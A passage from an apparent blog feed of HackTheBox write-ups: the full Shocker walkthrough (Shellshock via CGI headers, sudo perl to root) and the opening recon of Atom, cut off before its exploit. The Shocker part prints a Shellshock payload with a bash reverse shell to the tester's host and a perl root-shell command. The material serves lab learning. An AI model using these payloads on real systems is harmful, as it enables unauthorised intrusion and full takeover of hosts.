<ul>
<li>Nmap</li>
<li>Burp Suite</li>
<li>Gobuster</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-10 20:24 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.56
Host is up <span style="color:#f92672">(</span>0.065s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65533</span> closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 98.00 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The site serves only one a text and an image.</p>
<p><img class="img-container" src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  />
</p>
<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ curl -I http://10.10.10.56
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Date: Sun, <span style="color:#ae81ff">11</span> Jul <span style="color:#ae81ff">2021</span> 00:49:51 GMT
Server: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
Last-Modified: Fri, <span style="color:#ae81ff">22</span> Sep <span style="color:#ae81ff">2017</span> 20:01:19 GMT
ETag: <span style="color:#e6db74">&#34;89-559ccac257884&#34;</span>
Accept-Ranges: bytes
Content-Length: <span style="color:#ae81ff">137</span>
Vary: Accept-Encoding
Content-Type: text/html
</code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
<h4 id="gobuster">Gobuster</h4>
<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.56/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Add Slash:               true
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/07/10 20:26:07 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/cgi-bin/             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 294<span style="color:#f92672">]</span>
/icons/               <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 292<span style="color:#f92672">]</span>
...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
</code></pre></div><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.56/cgi-bin
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              cgi,sh
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Add Slash:               true
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/07/10 21:43:04 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/user.sh              <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 125<span style="color:#f92672">]</span>
...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
</code></pre></div><p>The <code>script.sh</code> returns the following contents.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
$ curl -s http://10.10.10.56/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 21:46:09 up <span style="color:#ae81ff">1</span> day, 20:28,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.01, 0.00
</code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-shelly">Shell as shelly</h3>
<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
<p>The following is the commonly used PoC for shellshock.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(){</span>:<span style="color:#f92672">}</span>; echo; &lt;bash command&gt;
</code></pre></div><p>The PoC works on <code>User-Agent</code> header.</p>
<p><img class="img-container" src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  />
</p>
<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
<p><img class="img-container" src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  />
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
<p><img class="img-container" src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  />
</p>
<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
<p><img class="img-container" src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  />
</p>
<p>The following bash reverse shell works.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">()</span> <span style="color:#f92672">{</span> :;<span style="color:#f92672">}</span>; echo; echo <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> | /bin/bash
</code></pre></div><p><img class="img-container" src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  />
</p>
<h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ export TERM<span style="color:#f92672">=</span>xterm
export TERM<span style="color:#f92672">=</span>xterm
shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
script /dev/null -c bash
Script started, file is /dev/null
shelly@Shocker:/usr/lib/cgi-bin$ ^Z
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7339</span> suspended  nc -nvlp <span style="color:#ae81ff">53</span>
→ kali@kali «shocker» «10.10.14.83» 
$ stty raw -echo; fg
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7339</span> continued  nc -nvlp <span style="color:#ae81ff">53</span>

shelly@Shocker:/usr/lib/cgi-bin$  
</code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ ls -l 
total <span style="color:#ae81ff">8</span>
drwxr-xr-x <span style="color:#ae81ff">2</span> shelly shelly <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">10</span> 03:31 test
-r--r--r-- <span style="color:#ae81ff">1</span> root   root     <span style="color:#ae81ff">33</span> Jul  <span style="color:#ae81ff">9</span> 01:17 user.txt
shelly@Shocker:/home/shelly$ cat user.txt 
7ac9eb73e6cb...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> shelly on Shocker:
    env_reset, mail_badpass,
    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin

User shelly may run the following commands on Shocker:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/perl
</code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
root@Shocker:/home/shelly# id <span style="color:#f92672">&amp;&amp;</span> hostname
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
Shocker
root@Shocker:/home/shelly#
</code></pre></div><p>The root flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@Shocker:~# cat root.txt
e3689b13acb2...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
</code></pre></div><h2 id="extras">Extras</h2>
<p>Since this vulnerability is interesting yet dangerous, I&rsquo;d like to observe how it works.</p>
<h3 id="playing-a-bit-with-shellshock">Playing a bit with Shellshock</h3>
<p>I did a quick test using the following script which placed under /<code>cgi-bin/</code> folder. The script will prints all the environment variables.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@Shocker:/usr/lib/cgi-bin# echo -e <span style="color:#e6db74">&#39;#!/bin/bash\necho test\nenv&#39;</span> &gt; iamf.sh
root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh 
</code></pre></div><p>And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.</p>
<p><img class="img-container" src="imgs/image-20210711100705447.png" alt="image-20210711100705447"  />
</p>
<p>The full response</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">HTTP/1.1 200 OK
Date: Sun, 11 Jul 2021 03:06:31 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 1113

iamf
test
SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;

HTTP_USER_AGENT=Blackhole
SERVER_PORT=80
HTTP_HOST=10.10.10.56
DOCUMENT_ROOT=/var/www/html
SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh
REQUEST_URI=/cgi-bin/iamf.sh
SCRIPT_NAME=/cgi-bin/iamf.sh
HTTP_CONNECTION=close
REMOTE_PORT=58222
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HTTP_IF_NONE_MATCH=&#34;89-559ccac257884-gzip&#34;
CONTEXT_PREFIX=/cgi-bin/
PWD=/usr/lib/cgi-bin
SERVER_ADMIN=webmaster@localhost
REQUEST_SCHEME=http
HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
REMOTE_ADDR=10.10.14.83
SHLVL=1
SERVER_NAME=10.10.10.56
CONTENT_LENGTH=0
SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
QUERY_STRING=
SERVER_ADDR=10.10.10.56
GATEWAY_INTERFACE=CGI/1.1
HTTP_UPGRADE_INSECURE_REQUESTS=1
SERVER_PROTOCOL=HTTP/1.1
HTTP_CACHE_CONTROL=max-age=0
HTTP_ACCEPT_ENCODING=gzip, deflate
REQUEST_METHOD=GET
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
HTTP_IAMF_HEADER=() {  :
}
_=/usr/bin/env
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://pentesterlab.com/exercises/cve-2014-6271/course">https://pentesterlab.com/exercises/cve-2014-6271/course</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Atom</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</link>
      <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</guid>
      <description>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server.</description>
      <content:encoded><![CDATA[<p>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploitation of Electron-Builder app through auto-update.</li>
<li>Redis enumeration</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Msfvenom</li>
<li>Netcat</li>
<li>Impacket</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ nmap -p- --max-rate <span style="color:#ae81ff">1000</span> -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-17 07:56 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.237
Host is up, received echo-reply ttl <span style="color:#ae81ff">127</span> <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65529</span> filtered ports
Reason: <span style="color:#ae81ff">65529</span> no-responses
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl <span style="color:#ae81ff">127</span> Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
135/tcp  open  msrpc        syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
443/tcp  open  ssl/http     syn-ack ttl <span style="color:#ae81ff">127</span> Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
445/tcp  open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows <span style="color:#ae81ff">7</span> - <span style="color:#ae81ff">10</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
5985/tcp open  http         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
6379/tcp open  redis        syn-ack ttl <span style="color:#ae81ff">127</span> Redis key-value store
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 153.92 seconds
</code></pre></div><p>A script scan doesn&rsquo;t really helpful, so I&rsquo;ll skip that here.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-6379---redis">TCP 6379 - Redis</h3>
<p>On Redis, authenticated is required.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «smb» «10.10.14.49» 
$ nc -nv 10.10.10.237 <span style="color:#ae81ff">6379</span>
<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> <span style="color:#ae81ff">6379</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
INFO
-NOAUTH Authentication required.
</code></pre></div><h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>SMB enumeration with Anonymous logon using <code>crackmapexec</code> reveals the Windows version and one writable share.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ crackmapexec smb 10.10.10.237 -u <span style="color:#e6db74">&#39;ANONYMOUS&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> x64 <span style="color:#f92672">(</span>name:ATOM<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:ATOM<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ATOM<span style="color:#ae81ff">\A</span>NONYMOUS: 
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             Share           Permissions     Remark
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             -----           -----------     ------
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             ADMIN$                          Remote Admin
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             C$                              Default share
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             IPC$                            Remote IPC
SMB         10.10.10.237    <span style="color:#ae81ff">445</span>    ATOM             Software_Updates READ,WRITE      
</code></pre></div><h4 id="software_updates-share">Software_Updates Share</h4>
<p>In <code>Software_Updates</code>, there is a PDF file called <code>UAT_Testing_Procedures.pdf</code>. I&rsquo;ll grab that file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ smbclient -N //10.10.10.237/Software_Updates
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> dir
  .                                   D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
  client1                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
  client2                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
  client3                             D        <span style="color:#ae81ff">0</span>  Mon May <span style="color:#ae81ff">17</span> 08:05:58 <span style="color:#ae81ff">2021</span>
  UAT_Testing_Procedures.pdf          A    <span style="color:#ae81ff">35202</span>  Fri Apr  <span style="color:#ae81ff">9</span> 07:18:08 <span style="color:#ae81ff">2021</span>

                <span style="color:#ae81ff">4413951</span> blocks of size 4096. <span style="color:#ae81ff">1361569</span> blocks available
smb: <span style="color:#ae81ff">\&gt;</span> recurse on
smb: <span style="color:#ae81ff">\&gt;</span> prompt off
smb: <span style="color:#ae81ff">\&gt;</span> mget *
getting file <span style="color:#ae81ff">\U</span>AT_Testing_Procedures.pdf of size <span style="color:#ae81ff">35202</span> as UAT_Testing_Procedures.pdf <span style="color:#f92672">(</span>121.5 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 121.5 KiloBytes/sec<span style="color:#f92672">)</span>
</code></pre></div><h3 id="tcp-80443---website">TCP 80,443 - Website</h3>
<p>Both port 80 and 443 are displaying a software company site called &ldquo;Heed Solutions&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210517190515610.png" alt="image-20210517190515610"  />
</p>
<p>At the bottom, there is a hostname and a download link that points to <code>http://10.10.10.237/releases/heed_setup_v1.0.0.zip</code>.</p>
<p><img class="img-container" src="imgs/image-20210517190532910.png" alt="image-20210517190532910"  />
</p>
<p>I&rsquo;ll add the hostname to my <code>/etc/hosts</code> file and then download the previous software.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ echo <span style="color:#e6db74">&#39;10.10.10.237 atom.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>After the hostname added, the site still shows the same content.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ curl -s -k https://10.10.10.237/ | wc -c
<span style="color:#ae81ff">7581</span>
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k http://10.10.10.237/ | wc -c 
<span style="color:#ae81ff">7581</span>
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k http://atom.htb/ | wc -c
<span style="color:#ae81ff">7581</span>
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k https://atom.htb/ | wc -c
<span style="color:#ae81ff">7581</span>
</code></pre></div><h3 id="analysis">Analysis</h3>
<p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p>
<pre><code>→ root@kali «loot» «10.10.14.49» 
$ file heedv1_setup_1.0.0.exe 
heedv1_setup_1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
</code></pre><p>It says &ldquo;self-extracting archive&rdquo;, meaning it can be extracted, for example using <code>7z</code>.</p>
<p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p>
<pre><code>→ root@kali «heed_extracted» «10.10.14.49» 
$ tree
.
├── $PLUGINSDIR
│   ├── app-64
...&lt;SNIP&gt;...
│   │   ├── natives_blob.bin
│   │   ├── resources
│   │   │   ├── app.asar
│   │   │   ├── app-update.yml # ==&gt; Updater config
│   │   │   ├── electron.asar
│   │   │   ├── elevate.exe
│   │   │   └── inspector
...&lt;SNIP&gt;...

73 directories, 274 files
</code></pre><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
$ cat ./<span style="color:#ae81ff">\$</span>PLUGINSDIR/app-64/resources/app-update.yml
provider: generic
url: <span style="color:#e6db74">&#39;http://updates.atom.htb&#39;</span>
publisherName:
  - HackTheBox
</code></pre></div><p>And again, it is the same site.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
$ curl -s http://updates.atom.htb/ | wc -c
<span style="color:#ae81ff">7581</span>
</code></pre></div><p>Guessing based on the content of <code>UAT_Testing_Procedures.pdf</code> file from SMB enumeration, <code>heedv1_setup_1.0.0.exe </code> is currently on testing phase. Other information that I can obtain are:</p>
<ul>
<li>The app is packed with electron-builder</li>
<li>The app has auto-update feature, but before releasing the updated app, the QA team will test it first.</li>
</ul>
<p><img class="img-container" src="imgs/image-20210517200229002.png" alt="image-20210517200229002"  />
</p>
<p>According to the image above, the <code>client</code> folder here probably refers to the ones on SMB.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-jason">Shell as Jason</h3>
<h4 id="rce-electron-updater---background">RCE Electron-Updater - Background</h4>
